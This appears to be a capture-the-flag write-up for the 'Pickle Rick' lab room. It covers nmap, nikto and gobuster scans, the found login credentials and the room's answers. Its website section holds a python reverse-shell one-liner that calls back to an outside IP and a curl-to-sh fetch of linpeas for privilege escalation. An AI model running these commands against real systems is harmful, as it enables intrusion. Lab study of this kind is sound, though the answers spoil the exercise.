# Pickle Rick

```
export IP=10.10.115.151
```

# Nmap

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 19:35 BST
Nmap scan report for 10.10.115.151
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:cb:09:40:25:d6:66:fb:6a:b2:98:b2:46:4c:9d:2b (RSA)
|   256 d3:59:0b:eb:a8:69:55:ef:d2:98:bb:d8:e1:f1:df:2b (ECDSA)
|_  256 02:91:10:fd:7f:53:1c:1a:a1:b7:7e:2b:81:94:b8:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds
zsh: segmentation fault  nmap -sC -sV -oN nmap/initial 10.10.115.151
```

# Task 1

```
1. What is the first ingredient rick needs? mr. meeseek hair

2. Whats the second ingredient rick needs? 1 jerry tear

3. Whats the final ingredient rick needs? fleeb juice
````

# Website

```
Insepct (crtl=U)

Username: R1ckRul3s

/robots.txt 

Password : Wubbalubbadubdub

/login.php

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.91.23",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

We have listener but not stable make stable

call_cmd "python3 -c 'import pty; pty.spawn("/bin/bash")'"
ctrl Z
call_cmd "stty raw -echo"
call_cmd "fg"
call_cmd "export TERM=xterm"

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

sudo -i "no password required"
```

# Gobuster

```
gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py -z
```

# Nikto

```
nikto -h http://$IP | tee nikto.log           

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.115.151
+ Target Hostname:    10.10.115.151
+ Target Port:        80
+ Start Time:         2022-09-24 19:37:26 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-09-24 19:42:32 (GMT1) (306 seconds)
```

# Complete
